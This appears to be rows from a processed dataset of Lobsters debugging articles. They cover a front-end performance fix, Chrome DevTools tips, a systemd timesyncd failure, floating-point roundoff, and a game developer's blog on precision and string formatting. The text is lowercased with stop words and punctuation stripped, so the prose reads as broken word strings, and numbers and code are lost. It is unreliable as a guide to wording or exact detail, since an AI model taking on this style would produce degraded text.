right probably one shitty component somewhere send entire application hell one point removed entire rendering meaning reactrenders performance still ie awfulonce removed entire rendering see improvement possible exactly bottleneck rendering data processing right middle point data received server passed ui component wow mindblowing mean expected performance issue xxi century rendering related plain well even better simpler fix vanilla j right naive voice head wonderedday price made choicea new day api call visual component mobxstatetree model creation put startendwindowperformancenow log right data passed model tree model second around modelsi tried like time le amount model obviously linear dependency number model let justify number talking hundred thousand app next model affect big picturethey combined treelike way journey model contains route route model contains segment etc let say creates journey route segment model take create time get know bit better little friend thought went checkout gitrepo mobstatetreei started checking filed issue repository good practise putting module base application code well late herei searched perf issue got quick go head people complaining thing seems like maintainer gon na fix fact already fixed released next major version mst released yet moment described event already released obviously wait released hope fixed performance guy need release app well yesterdaybut know else considering timeworkmoney concern day acceptance else doso pretty thing codebase live avoid facing run away big fighting thought obviously cut code maybe rewrite functionality maybe even make work without bug maybe event make real world software engineering tough choice one told first image carousel jquery right time rewrite let see option problem model creation block j thread user see update screen cheap solution repeatedly unblock main thread task uiupdates picked event loop checkout video new concept chunk simple like thatchunking approach classic handling big amount data long list ui etc definitely used many time application lazy loading pagination ideaif heavy task always split portion chunk chunk chunk taking pause neededapplying situation thinking split data right received chunk journey send chunk chunk pausing allow ui update easy peasysimplified get ideai got one issue far mentioned tree next model journey route segment linked id server coming normalised needed connect manually make sure chunk journey exactly enough data work le trick need efficient possible since luxury writing performant code create complete data structure normalised array model ie search long list object id combine object togethersolution well definitely come data structure algorithm complexity many way search ideal simplest way convert array object id key getting search min felt like working better much better need way measure day half custom tool measure performancehere thing probably heard many time someone feel like app slow without even knowing profiling number matter number say user happy happy user last thing dream question measure user feeling apparently task hard welluser feel work slower expected obviously precise feeling real time app behaviour distract real time guess user notice knowing know measure user feeling measure code work compare real time know stupid simple theory stupid simplerun settimeout computer time measure differs real time quite different mean code execution took allowed find gist complete code heretime test well definitely le sec deal app progress bar timer sec top page progress user search timer update second user see much time takesbefore progress bar hang sec state second user pressed search jump end course user waited second blank screen close progress bar update second user see number sec sec significant improvement see measurement smooth since creates model chunk take sec per chunk average soif animation screen quite noticeable something wrong sec sec apparently enough much better user experience course still acceptable better challenging myselfday better thatwhat know far model creation heavy task even smaller amount chunk still affect ui rerendering really need time good question brings u second solution postpone heavy code execution aka model creation impossible wait anymore longerthat journey list screen scroll add step well ie user scroll get journey mean cold start need model even bother model minute create caching service communication bridge scroll event model initialisation pas data server right mobxstatetree instead caching data plain javascript object later using create model required uiwell definitely le sec like pressing search button progress bar update second thanks chunk still creation model chunk take sec average progress bar hang time hard noticeafter progress bar hang sec pressing search button update second perfectly smooth without interruption scroll though hang sec since another model chunk creation little evil need accepti thought originally sec blank screen user wait app usable cheap fix app ready use le secthat alright elephant room big get rid decoration able make way le noticeable code quite room improvement many different place ismomentjs slow big replaced dayjs save secondstracking logic heavy data tracking composed display value composed time via search list calculated cached somewhereand much much already another fairytalefinal thoughtsremember time animation jquery lugging quite badly chrome still could thing actionscript flash way better faster needed big editable table work cutting using createdocumentfragment reduce reflows finally able prevent browser crash time fly seems like yesterday microsoft launched edge browser one give damn amen yeah relieve finally drop support year old browserso new thing give headache front end developer mobile fact far new fair transformation happened fast shift user desktop mobile happened like year ago right mobile browser target audience please stop testing everything new macbook pro performance something simply apply end sometimes impossible expensive fix consequence bad code application architecture chosen librariestake average android phone test application might story
285,Lobsters,debugging,Debugging,Art of debugging with Chrome DevTools,https://medium.com/frontmen/art-of-debugging-with-chrome-devtools-ab7b5fd8e0b4,art debugging chrome devtools,use consoletable log tabular data use color make log stand documentqueryselector documentqueryselectorall arraylike nodelist map reduce filter geteventlisteners debug fn copy obj toplevel await asyncawait f e debugging source panel enable autopretty print inject console log prod conditional breakpoints freeze ui inspect element appear hover xhr breakpoints use devtools ide via workspace medium post addy osmani createreactapp vuecli use network override tinker production code nodejs debugging ndb use snippet debugging utility lot useful devtools snippet,use consoletable log tabular dataif variable logging array object instead using traditional consolelog make use consoletable give nice tabular representation data much easier consumeuse color make log stand outit easy get lot noise log may log log thirdparty widget browser log besides using filter make log stand using color console using library assigns global variable like jquery use shortcut documentqueryselector documentqueryselectorall respectivelybesides saving keystroke also return true array instead arraylike nodelist use array method like map reduce filter result immediatelyeg check broken link page using like want reference dom element use shortcut give reference currently selected element element panel currently selected element previously selected element go way use get hold result last evaluated expression consolegeteventlisteners geteventlisteners domelement give object registered event listener dom element eg want reference click handler button remove modify runtime production environment allows soyou may noticed gif expression typed console immediately evaluated press enter get value value eagerly displayed console new feature available canary right called eager evaluation debug fn example want pause execution button clicked use debug method debug fn take function reference argument everytime function invoked debugger pause execution first line functionimagine debug issue button click idea source code lie handler button instead digging source code use geteventlisteners method displayed get reference click handler button pas function reference debug method click button devtools pause execution first line click handlercopy obj copy anything handy utility console allows put anything system clipboardgive copy mangled json pretty print youtoplevel awaitasyncawait make handling async operation super easy understandable downside await ing need done async function want use asyncawait devtools console would wrap immediately invoked async function expression iiafe convenient devtools support toplevel await need wrap awaits inside iiafedebugging source panelsources panel true debugging happens using breakpoints steppinginto steppingover etc get lot info state thing application guide towards source issue going write use debugger going assume already knowledge instead going share tip trick like use source panelenable autopretty printnow canary behind experimental flag make sure code see source panel automatically prettyprinted one le thing worry aboutinject console log prod conditional breakpointsbreakpoints great even better conditional breakpoints conditional breakpoints breakpoints pause execution condition evaluates true devtools pause every single time want learn conditional breakpoints herei like use conditional breakpoints inject consolelogs production code modify source code breakpoint condition consolelog devtools never break breakpoint consolelog return undefined falsy evaluate expression therefore log variable consolewhy use regular breakpoint inspect variable sometimes want eg trying inspect code get executed high frequency like touch scroll handler want debugger pause every single time want log variable inject consolelog even production codefreeze ui inspect element appear hoverit hard inspect element appears hover eg inspect tooltip time rightclick inspect element longer hovered tooltip gone way freeze ui inspect element pagethe trick like use isopen source paneldisplay tooltipuse keyboard shortcut pause script execution hover pause icon find keyboard shortcut script execution paused go back element panel inspect tooltip used toxhr breakpointswhen trying figure certain request made made use xhr breakpoint source paneluse devtools ide via workspacedevtools source panel pretty advanced editor easily fuzzysearch file go line go symbol run snippet use multiple cursor etc documented well medium post addy osmanibut bring entire development workflow devtools waste time switching application context using workspaceeg project built createreactapp vuecli drag entire folder source panel devtools automagically map network resource local one start editing file devtools view change right away make efficient feedback loop debugging applicationsuse network override tinker production codeif battling production bug want tinker production code without set thing locally use network override featureit allows easily map resource come network local copy edit devtools editor devtools always serve local copy even cache cleared resource change server service worker involvedthis allows super easy debugging production nifty performance experimentsnodejs debuggingif want use devtools debugger debug node application easily invoking node script inspectbrk flagnode inspectbrk scriptjsgo chrome inspect node session appear one remote target inspectalso devtools see green node icon clicking fire chrome debugger node sessionif wanted debug unit test eg devtools debugger something likenode inspectbrk nodemodulesbinjestit kind awkward figure link actual executable googlechromelabs recently released tool make infinitely easier called ndbwith ndb need isndb npx jestif custom npm script use devtools debugger easilyndb npm run uniteven better run ndb project packagejson automatically find script packagejson debug using devtoolsuse snippet debugging utilitiesdevtools come tool create save snippet code run anywhere like use snippet extend debugger additional utility method likelodashify add lodash app entire lodash utility belt timeanother example utility method augment object property whenever accessed modified give nice trace accessed property changed useful debugging state changed something code somewherethere lot useful devtools snippet available grab use advantagethat post followed another post focus use devtools debug performance issue additional tip trick feel free share comment section found useful please share others benefit
286,Lobsters,debugging,Debugging,A timesyncd total failure and systemd's complete lack of debugability,https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdTimesyncdFailure,timesyncd total failure systemd complete lack debugability,switching using systemd timesyncd ubuntu machine dynamic user rather unhappy era reboot server maybe fix systemd general current attitude update systemd feature dangerous,last november wrote entry switching using systemd timesyncd ubuntu machine ubuntu default using timesyncd set standard ubuntu environment stuck default behavior although customize list ntp server today discovered timesyncd silently died one server back july worse could nt restarted specifically reported systemdtimesyncd failed create state directory permission denied state directory complaining varlibsystemdtimesync actually symlink varlibprivatesystemdtimesync least system good order symlink something happen apparently get error timesyncd clever informed theory wrong thing turn strace say wrong surprise strace f p system produce either explosion impossibly large amount output would different thing system actually use basically almost idle server used part testing upgrade production server according strace failing timesyncd attempt access varlibprivatesystemdtimesync special uid gid systemdtimesync failing prosaic reason varlibprivate owneronly owned root since work ubuntu machine presumably actual failure somewhere else real problem impossible diagnose debug situation simply get far read systemd source code find code timesyncd printed specific error message search line strace output still nt know problem fix even confident rebooting server change anything especially relevant piece server seem piece working server know according log failure started happening immediately systemd package upgraded reexecuted hand systemd upgrade also happened ubuntu machine nt timesyncds explode since systemd clear diagnostic information spent great deal time chasing red herring look varlibprivatesystemdtimesync failing system owned numeric uid gid working system magically special login group systemdtimesync systemd dynamic user facility action combined systemd creating varlibprivatesystemdtimesync directory right login group execing timesyncd binary timesyncd fails start systemd remove login group leaf directory behind owned existing login group might think failed create state directory error message would mean timesyncd one actually creating state directory strace say otherwise mkdir happens exec new process become timesyncd still systemd code timesyncd code try create directory presumably internal systemd function using fine directory already right ownership rather unhappy situation even unhappier effectively nothing aspect except stop using timesyncd something arguing especially since server drifted half second synchronization found issue entirely coincidence reporting bug either systemd ubuntu hopeless systemd tell reproduce latest version ubuntu ignore always simply happens systemd developer produce design implementation nt explain actually work nt contain real support field diagnosis get return era reboot server maybe fix given systemd general current attitude nt expect change time soon adding documentation systemd internals diagnosis probe would admitting internals bug problem issue supposed happen p extra stupid thing whole situation thing varlibsystemdtimesync used hold zerolength file whose timestamp used track last time clock synchronized nonroot user ca nt even see file ubuntu update identified cause problem described new entry systemd dynamicuser feature dangerous short version systemd silently failed set custom namespace would given timesyncd access varlibprivate could deal fuse mount nfs mounted user home directory worldaccessible
287,Lobsters,debugging,Debugging,Floating (point) butterfly effect: Searching for tiny bugs that cause big problems,https://blog.esciencecenter.nl/floating-point-butterfly-effect-62ebe004200f,floating point butterfly effect searching tiny bug cause big problem,roofit strange attractor dschwen work cc round round round go swarm butterfly parallelizing roofit dealing chaos catch butterfly print value hexadecimal notation trace problem source trigonometric function different mapping value different range lourensveen make sure order fixed kahan summation use higher precision floating point type instead bit rob van nieuwpoort edited reprint,last year took week look floating point roundoff error roofit particle physic model building fitting code used many large experiment like higgs boson search cern lhcmy job make roofit faster parallelizing part without changing outcome calculation however found fitting model data set basic purpose code using new method yield exactly uhohnow whenever hear holy mantra innocent roundoff error immediately jump hope reading blog feel way help encourage people chase butterfly shared helpful tip solving floating point precision issue sure add tip experience comment lorenz strange attractor icon chaos theory butterfly effect dschwen work cc round round go numerical computing quite common encounter roundoff error due floating point precisiona sum difference two innocent looking value like twothirds may take firsttime programmer surprise instance python tell equal student basic math seven end would made sense five crazy talkcue lesson floating point number student sleep well knowing world still make approximate sensefor computational scientist pretty soon error become fact life thought given one encounter error anthropologist studying tribe computational scientist would certainly identify phrase yeah always inevitable roundoff error one community central chant prayer digital deityyeah always inevitable roundoff experience also talking many people year floating point roundoff discarded integral part numerical science instance large simulation data analysiswhile useful daytoday reflex pay take deeper look calculation try find exactly get result expectedbetter yet try find whether get result looking relevant much performance cost versus much gain even year experience perhaps especially going back basic way help gain new perspective memost time error really issue sometimes turned roofita swarm butterfly parallelizing roofitthey leave quite messparallelization common source roundoff error fact error happened actual parallelization result bit like example sometimes much significant digit like versus certainly explained floating point roundoff alone seeing point roofit robustly determine whether billion chf many thousand hour spent sensibly one might imagine anxiety error could produce stakeholder particle physicist funders world myselfin end error could explained combination factor originating floating point precision error initially tiny error fact blown cause larger error sawdue sensitivity fitting algorithm bitsize difference input change direction search model optimal parametersafter several search step bitsize difference ensuing differing search direction made big difference outcomedealing chaosroofit compensate search strategy demanding certain precision search outcome default precision come precision significant digit explains difference outcome never larger thatstill kind imprecision long way difference order numerical scientist well used stand immediately trying reproduce earlier experimentsin fact effect sawsome run algorithm using particularly pathological model converged lot slower sometimes converge small difference search direction bring algorithm problematic part parameter spacein case roofit actually minuit minimizer behind scene deal quite cleverly case usually take extra timehow catch butterflieslike ninjahere thing encountered try remember next time find situation print value hexadecimal notation floating point number always rounded way settle anything le absolute bitwise truth instance c use std cout std hexfloat yourfloat set back decimal afterwards using std defaultfloattrace problem source may sound obvious huge pain as reckon fact reason people accept floating point value ok reason accept surely navigating layer function passing value along arduous arriving source still challenging see exactly causing error especially multiple arithmetic operation involved example trigonometric function like sine give identical result much three consecutive bitwise different floating point number mainly around maximum minimum mean inverse relation arcsine fact hide floating point error become paranoid floating point error notice bitwise difference input cause difference outcome expecting even vexing initial different outcome technical term crap mapping value different range using division like often happens coordinate transformation cause loss least significant bit thanks lourensveen pointing one instance mapping useful case note also cause nasty bug mapping operation result value outside intended bound like next time encounter bug rip hair try consider even sure math check need make sure computer agrees programming twoway conversationwhen sum make sure order fixed often issue parallelasynchronous programming order core finish calculation depends external factor like incoming email whether replying email downloading embedded image email many possible concurrent process o trying schedule simultaneouslyalso sum possible use higher precision algorithm kahan summation instance error bound order floating point precision error typically lot precise naive summation although cost operation instead one precision usually come cost performanceone easiest thing upgrade algorithm use higher precision floating point type precisioncrucial part calculation like double instead float though even seemingly simple trick lead problem instance modern processor socalled extended precision floating point precision mode float internally represented instead bit extra bit used fix precision error expecting error one way getting confusion ensuesdo related story involving precision error great tactic avoiding share comment edit aug join discussion reddit edit aug great suggestion rob van nieuwpoort check paper every computer scientist know floating point arithmetic originally david goldberg edited reprint seems like really great reference almost anything floating point
288,Lobsters,debugging,Debugging,NaNs cause the craziest bugs,https://tomforsyth1000.github.io/blog.wiki.html#[[NaNs%20cause%20the%20craziest%20bugs]],nan cause craziest bug,,welcome tiddlywiki created jeremy ruston copyright jeremy ruston copyright unamesa association man blog nt even day old already getting shit information overload caused using sophisticated new wiki technology one nt like ca nt read lunix box another moan much stuff click ca nt use text file dammit like snazzy new gratuitous tech blog going mainly snazzy new gratuitous tech occasional uphillbothways nostalgia moan added good measure since thing totally meaningless selfcentered blog going use like stole er thanks jeremyhttp wwwtiddlywikicom like demanding use m tech anything hentai like er news none except went see accountant today said owed man five digit ok immigrant brit living u seeking asylum crappy pay stay nt cast nasturtium mr potus visa making money u company spending hardearned cash u company would slightly impolitic utter phrase taxation without representation yeah thought even get green card tell hrh brenda shove get cast pointless vote local united franchise america gon na book plane ticket boston gon na tip crate shitty bourbon harbour yes harbour got u blow laphroaig wenchthewife fair got mildly obscene christmas bonus account supersecretproject want bos ca nt mine mine double precision magic people keep invoking like problem float floatingpoint number brilliant decent precision large range still bit still different one actually fewer ignore variety nan assume infs basically bug turn denormals agonisingly slow tradeoff weakness like everything else need know happens example subtract one small number another get imprecision ideally every programmer know basic floatingpoint numerical precision time subtract add implicitly consider happens two number close together eg result going roughly course roughly going pretty rough general get sixandabit decimal digit precision float problem nt precise could anywhere result subtraction anywhere impressive precision second digit wrong need refactor algorithm fix obvious place happens game storing world coodinates standard two object get decent way origin first thing rendering subtract camera position object position send way rendering pipeline rest work fine everything relative camera first subtraction problem example getting six decimal digit precision origin london easily across get accuracy nt sound bad static screenshot soon thing start moving easily see horrible jerkiness quantisation double trouble solution obvious single precision nt enough switch storing position double precision unfortunately practical problem obvious machine simply nt double mobile device machine support double usually speed penalty even nice modern pc actually getting doubleprecision tricky enough write double c would far simple bruce dawson nice roundup extensive problem article guaranteed surprise even experienced coder read http let say went build agony get working accepted speed hit really nt solved problem brushed carpet double exactly weakness floatingpoint representation variable precision catastrophic cancellation done shuffle problem corner stuck finger ear yelled lalalalalala still come back bite double precision even rarer even harder track exchange hurt execution speed caused build problem fix alternative good old fixedpoint number oldschool technique day coprocessors simply integer treat defined place decimal point usually expressed something like mean integer represents realworld value bit whole value bit fraction example real number x would represented integer int x appropriate rounding general math fixed point sound like real pain going lie written raytracers fixedpoint math constant management precision really suck even good macro library huge improvement usability math code absolute position absolute time fixedpoint work really well ever subtract one position another produce delta add delta position almost never need math like multiply two position together nt even mean anything fixedpoint integer supported pretty much every platform even natively supported easily emulated thing like addwithcarry instruction platform awful support anyway fixedpoint representation completely reliable precision integer scariness completely portable easy debug know exactly getting term precision huge implication robustness testability work machine like develop code tiny sandbox game level nt spend five minute loading asset full level yay everything work fine physic work gameplay movement work fallingoutofmaps stuff everything smooth check several week later someone say bad stuff happening level x object falling floor moving erratically physic bouncing oddly test level x seems fine work machine argument tester take several day figure happens one part level x would nt know part long way origin part physic code subtracting two large number getting imprecise result nice thing fixed point consistent get precision everywhere time step physic epsilon work origin work everywhere moan fixedpoint nt range bit fixedpoint get anywhere earth enough well bit precision get furthest distance pluto sun billion km submicrometer precision consistent precision lumpy part fine part place suddenly get denormals creeping performance go floor wellidentifiable reason time position let talk time time really fall place often bite people sort precise timing physic animation sound playback need good precision totally reliable precision tend bunch epsilon need tuning almost always taking delta absolute time eg current time time animation started sound triggered everything work fine game first five minute absolute time probably started zero getting lot precision play four hour everything really jinky jittery reason four hour right millisecond running float precision anything measured millisecond physic sound particularly susceptible almost motion game show jittering added hilarity tester run across problem timing precision save game send coder coder load nt happen time got reset zero effective way drive qa completely insane fixedpoint give completely reliable precision matter long game running interesting note fixedpoint time easy precedent follow network time protocolhttp enwikipediaorgwikinetworktimeprotocol timestamps use format second meaning bit measuring whole second bit measuring fraction second precision picosecond roll every year good enough game addition easy human read use top bit time second side considering extending format fix rollover give completely gratuitous range precision quote bit value fraction enough resolve amount time take photon pas electron speed light bit second value enough provide unambiguous time representation universe go dim protect even nt believe anything else post even absolutely insist floating point fine everything please least understand setting time zero start app terrible thing fool chance someone might play game four hour leave main menu four hour leave paused midgame four hour initialize clock much much four hour least way find problem sooner implementation tip think easiest way encapsulate oop fan make position class hold chosen representation operation perform class aside copy usual subtracting one another give standard adding position get another position mean ca nt accidentally use position without calculation relative another position go time internally might use number outside world need know timeatimeb quite happily similarly operation need time adjust forward backwards timestep fine timestep find operation actually need probably time refactor code likely problem thing different distance origin different time one thing seen people making bsp tree entire world storing plane b c axbyczd fine except also going precision problem going precision problem far earlier x z another object position multiplying two position together subtracting bunch asking positive negative problem halve available precision even double get bit precision rubbish experience bsp tree shown extremely intolerant precision error solution case store point plane plane normal otherwise even decentlysize level going end agony michael abrash story exactly like quake tiny tiny level problem restricting taking delta two position highlight problem like allow rethink happen tldr nt start time zero start something big ideally position default set origin long way away precision problem even normal circumstance get seven digit precision tricky beast use practice writing double c sufficient variable precision nightmare reproducibility testability even fixedpoint may old work well absolute time position help guard precisioncancellation problem exposing absolute time position part app time think need almost certainly going problem wrong new offendomatic rule time want use double game probably nt understood algorithm always hated two thing sprintf main annoyance format string come argument really nt read well easy get argument wrong way round add forget one related fact typesafety screw lead silent andor really obscure memoryscribbler bug one alternative coutiostream style format lot stuff everywhere make eyeball itch amount c involved ugly use string destination third option smart string complexity constant allocdealloc behaviour also offends honest worry lot magic allocation stuff far complex mortal debug profile far easy write line simplelooking code destroy performance hoping reinvent wheel people pointed fastformathttp wwwfastformatorg mode seems sortof want documentation disaster scope thing clearly huge way beyond need rather wade two hour thought see could write something simple two hour want turn answer yes goal dynamic allocation easier read control sprintf typesafe much c ever typesafe bloody autoconverts overflowsafe ie refuse scribble assert debug mode thing happy give extendablelength string ie nt mind predeclaring max length string kinda obvious since nt want dynamic allocation worth stating explicitly first thing wrote almost worked first bit easy struct staticstr unsigned int maxlen char pstr staticstr char pstrin int maxlengthin maxlen maxlengthin pstr pstrin staticstr nothing cast normal string deliberate const careful char cstr return pstr assignment staticstr operator const staticstr assert strlen otherpstr maxlen strncpy pstr otherpstr maxlen pstr return assignment c string staticstr operator const char pother assert strlen pother maxlen strncpy pstr pother maxlen pstr return staticstr operator const staticstr int thislength strlen pstr assert thislength strlen otherpstr maxlen strncat pstr otherpstr maxlen thislength return actualy append really rather typing get tedious staticstr operator const staticstr return append c string staticstr operator const char pother int thislength strlen pstr assert thislength strlen pother maxlen strncat pstr pother maxlen thislength return staticstr operator const char pother return pother slightly ugly used like staticstrdecl define staticstrdecl name length char staticstringcalled name length staticstr name staticstringcalled name length char ptemp staticstrwrap ptemp define staticstrwrap name strname staticstr name strname sizeof strname sizeof strname work fine sticking string together code like staticstrdecl char tempstring staticstrwrap tempstring hello world obviously usefully code like world hello note annoying brace hello way like fails compile operator take left hand char nt figure different precedence would fix thing pretty minor annoyance sure somebody c operator overloading experience tell fix honestly sure want know technically nt allowed operator append write hello hate typing part impetus make thing easier read harder also reason really nt want pollute brain nt email operator precedence change actually get hello mean although correct contains world really want wanted course still get strange thing happening case forget brace hello world forgot brace still compiles run contain hello world maybe sort gratuitous const gymnastics could fix right going ignore hope nt bite arse later yeah right ugh anyway actual number printing well first attempt use temp string function wrap sprintf staticstr int int int written snprintf pstr maxlen assert written unsigned written maxlen return way use like hello world work hello world problem come want print multiple number using temp hello world problem two int function get called concatenation happens get hello world called last first also mystery least expecting get hello world probably poorly defined anyway note nt operator precedence problem adding lot brace nt fix problem nut cup tea sitdown think alternative came turn much nicer type completely avoids temporary problem faster speed exactly priority especially printing float never bad thing first step add seemingly pointless helper class struct ststint int mvalue ststint int value mvalue value method also ststfloat stst abbreviation staticstr see want shorten bit add method staticstr staticstr operator const ststint int strlen strlen pstr int written snprintf pstrstrlen maxlenstrlen othermvalue assert written unsigned written maxlen pstr return complexity dealing completely bonkers behaviour snprintf various overflow checking actual conversion stuff simple write fairly elegant stuff like world hello ststint ststint still need extra brace annoyingly work fine temporary either value snprintfed right onto end existing string fact nt get modified nice well though worry might undefined behaviour maybe nt push next step handle formatting sometimes want routine get slightly complex struct ststfloat float mvalue int mprecision int mminwidth ststfloat float value int precision int minwidth mvalue value mprecision precision mminwidth minwidth staticstr operator const ststfloat int strlen strlen pstr int written othermminwidth othermprecision written snprintf pstrstrlen maxlenstrlen f othermvalue else written snprintf pstrstrlen maxlenstrlen f othermprecision othermvalue else othermprecision written snprintf pstrstrlen maxlenstrlen f othermminwidth othermvalue else written snprintf pstrstrlen maxlenstrlen f othermminwidth othermprecision othermvalue pstr assert written unsigned written maxlen return mean elegant thing like hello ststfloat ststfloat ststfloat ststfloat produce hello nt ask default precision snprintf like many decimal point anyway got wish got zerodynamicallocation typesafe formatfree fairly readable version sprintf happy coder joy joy mission choose accept go find wheel reinvented thus saving hassle embarrassment using library evermore blog selfdestruct get around someone prodded day thought get gave gdc talk sh never really happy half hour nt really enough cover well nt changed slide note corrected error finally wrote elusive fconstx value mainly talk surrounding detail console implementation actually used probably coolest bit least bit artist really liked new system spherical harmonic actual game note rest removed front page save space blog entry chronological order vr optic ipd mean many thing nt larrabee fail srgb learning curve nan cause craziest bug memory stack resizable array premultiplied alpha part texture coordinate origin elite dangerous rift display rate rendering rate persistence wrangling enums simple perforce setup solo coder even precision resizable array without using stl polynomial interpolation interview sparseworld storage format matrix math name new job sprintf nt ugly saving loading replaying debugging startopia love logging asserts unit test data oriented luddite moore law v duck typing platformagnostic type texture streaming system two level cache visibility priority test streaming asset square hex dwarf minecart tycoon larrabee talk roundup medium attention gdc walk better larrabee isa unveiled gdc ca cloud formation regular mesh vertex cache ordering siggraph asia plague siggraph available free larrabee raytracing renderstate change cost larrabee decloak blog linkage smart coder priority rasteriser v raytracer texture format faster compression knowing mipmap level needed sse patently evil trilights bitangents vertex cache optimisation reinventing wheel shadowbuffers shaders utah teapot gdc survival guide pixomatic slide notepad sh license added hindsight note spherical harmonic cellular automaton article added impostor article added shadowmap v shadowbuffer vertex cache optimisation stripper scene graph say dodgy demo premultiplied alpha babbage true genius someone cited vipm article vipm article html r part vga good enough grandfather r part matter precision game middleware list r banditry load word beginning set article set mike action friend http altdevblogadaycom reading analytical engine known background babbage life work age knew incredibly clever difference engine amazing feat consider made mechanical gear powered human cranking lever fundamentally bunch parallel addition time would done extremely fast awesome reliability actual computation perfectly wellunderstood way ever london go visit science museum south kensington see difference engine enwikipediaorgwikidifferenceengine built truly fascinating watching work work well thing nt realise read bit actually built achievable tolerance mean babbage actually could built whole thing would worked convincingly usefully problem political financial rather mechanical nt help pompous jerk like many genius perfectly wellunderstood math difference engine could nt anything revolutionary would done far better existing mechanism room full people adding stuff manually real genius came analytical engine always known first programmable computer people say always imagine well yes slightly smarter jacquard loomhttp enwikipediaorgwikijacquardloom maybe squinted bit jumped many flaming hoop might see getting close turingcapable examined manual lot cunning could get something kinda like proper algorithm certainly looked functionality computer always looked like analytical engine bag bolt mathematician show page jargon made turingcomplete much better basically bell literally lot detailshttp wwwfourmilabchbabbagecardshtml including emulator basically fairly straightforwards machine language addition subtraction multiplication division two input register output register load store memory entry input register load second register operation ask put result output register move store also shift left right move decimal point around fixedpoint math result computation different sign first input overflow make runup lever move upwards one could imagine tying small bit cloth lever one might term raising flag issue command say move backwards forward set number command tell time runup level raised hey unconditional conditional branch mean absurdly simple load store basic six arithmetic operation conditional branch right front processor could code look code comment preload memory location number preload memory location number preload memory location number x set operation multiply load memory location alu load memory location alu second load cause multiply operation happen store result location set operation subtract load location load location cause subtraction happen store location load location load location cause subtraction happen result sign different first argument runuplever raised cb runuplever raised move back instruction like today cpu location instruction pointer already moved past instruction back mean next instruction x result function location notice location never get stored constant value still bit trouble let translate c int mysteryfunction int int const int keeplooping sgn sgn goto keeplooping return change massage conditional appropriately int mysteryfunction int int keeplooping goto keeplooping return ca nt still trouble factorial function apart slight wackiness loop counter idiom like language absurdly simple powerful big thing missing alu direct boolean logic complex control logic huge lack first emulated without much pain decimal logic add multiply etc secondly five minute playing thing would realised needed something like mechanicals boolean logic trivial compared decimal multiplication division gild lilly babbage wanted attach plotter could send recent computed result xcoordinate ycoordinate plotter could raise lower pen could coded tron lightcycles damn thing one thing missed fair half computer pioneer ability compute address ie instead always looking data location n n punched card ability calculate n math however think precomputed lookuptables one form loading storing amusingly decided actually since table eg logarithm generated ae earlier run lookup involved ae displaying number ringing bell getting man go rummage stack punchedcards right one would take time errorprone also primitive errorchecking system might better machine recomputed desired value rather using lut almost exactly computing luts frequently slower le accurate redoing computation total vacuum nothing paper pen brass plan brain invented frighteningly useful powerful easytoprogram processor including comment debugging support nt even machine powerful cashregister time nothing say babbage genius one great succeeded even slightly difference engine got halffinished produced useful result people taken seriously turing von neumann stuff think birth modern computing obsolete even thought babbage got nearly century put like born almost exactly year later instead brass steam worked relay electrickery would made almost exactly breakthrough probably built almost exactly machine would bit faster le reliable bloody valve almost shameful year nobody advanced art computing slightest yet think thing happened year since read sterling gibson book difference engine age ago thought bit flight fancy pushing probability curve breakingpoint way sf author sure fanciful imagine living world computer three time long gordon moore famous law would gone totally ballistic microsoft motto would computer every coke computer every desk since big thing helped ally beat nazi would nt radar would web one bizarre thing ca nt figure babbage initially specified analytical engine decimal digit later upped decimal digit bit gigantic even fixedpoint arithmetic day find bit fine decimal digit specialised place digit bit nut collossal overengineering nt understand math extremely clear writing understood fixedpoint math perfectly well shifting stuff multiplication division etc two separate place explained arbitraryprecision arithmetic using runup lever ie ae version addwithcarry case people needed digit number put perspective universe least billion lightyears wide x meter single proton meter across universe roughly x proton size take decimal digit represent babbage decided nt enough needed full digit also specified memory entry number nt include code data randomaccess data smart guy whose major problem finding good enough largescale manufacturing technology finding cash build gigantic roomsized engine seems pretty dumb built ae instruction set would exceeded computing capability every machine home microcomputer revoloution digit beaten st amiga perinstruction computing power aimed little lower could almost built thing workshop son constructed threedigit difference engine part found house death instead spending half time arguing fabrication engineer begging parliament royal society everincreasing sum money waste still genius finest calibre theory babbage actually given speakandspell dr maybe sarah connors rational explanation heard eyeopening rant chris hecker day rant already knew wii one half gamecubes stuck together duct tape one bitangents hear ask mean binormals turn rule bi mean object arbitrary set property need two nt matter two need two different example curve space one normal load normal whole plane fact need two pretty much two call one normal call binormal standard classicallanguage hijack bix mean two x second x binormal come curve note curve single tangent vector well ok two one negative ok surface single normal really one normal load tangent entire plane plane surface need pick two typically surface textured concerned line constant v line constant u one called tangent logically one called bitangent yes heard binormal rant bumpmapping surface talk normal tangent bitangent nobody quite sure people cottoned word binormal certainly spent last ten year talking binormals know still wrong speak bitangents though going cause chaos nice backwardscompatible file format endeth lesson game film made muckyfoot except almost nothing film making time film nt know much plot used character different story neat feature fighting kinda nifty used dualstick robotron melee control left one moved blade right one would attack direction pushed exact attack used timing weapon came xbox wrote xbox rendering engine platformspecific stuff sound controller saveload etc start decided two platform different share much code mostly proved right though end share thought mainly streaming code lighting stuff originally nt going try stream data assumed dvd seek time would kill u worked much better thought extra memory really helped fairly proud graphic engine got lot good tech streaming almost rendering resource neat code deal multiple dynamic light source compileondemand shaders really good vipm stuff xboxonly feature nice selfshadowing first experiment shadowbuffers coollooking cloth simulation blade cloak incidentally lighting huge pain see blade black guy wear black leather black shade hunt vampire going bright sunlit level pretty much always sewer night result basically invisible fine show lurking shadow film game kinda able see going pretty much reason could see cranked specular highlight like crazy made everything else scene fairly bright colour least silhouetted despite happy technical level still rather rushed game pretty rough edge level rather dull would better shorter game back nt acceptable ship anything le hour play even lot play bit dull cest la vie going add blog blogroll thanks much please use http wwweelpigotdnsorgblogwikihtml address actually see browser one change ifwhen move isps thanks pascal sahuc emailed link neat paper cloud simulation cheap ca simple efficient method realistic animation cloud http citeseerxistpsueduviewdocsummary dobashi kaneda fact absurdly cheap cell three bit boolean test amazed wonderful result come simple rule three bit state smooth field rendering still look really goodhttp videogooglecomvideoplay another article got converted html hindsight wish found fun game put code seemed work really well could nt think anything really cool paper article sectionhttp wwweelpigotdnsorgpaperspapershtml hobby game dwarf minecart tycoon went fundamental behind data oriented design movement moore law v duck typing going actually cover dod honestly nt yet know sure even main proponent either understand problem example solving specific case sure yet good framework rule would nt nice set library make sure nt problem first place also keeping code readable flexible also paying much attention since longer fulltime game coder although still write plenty code complex stuff nt super fast stuff fast nt complex leave others explain dod since screw want make metacomment dod folk widely seen bunch ninja curmudgeon bitheads although think probably quite proud label image conveys folk handtune assembly routine known man loathe anything higherlevel argue set associativity dtlb walking tell many clock cycle main memory clever nt know stuff think well rounded programmer use word virtual commence much wailing 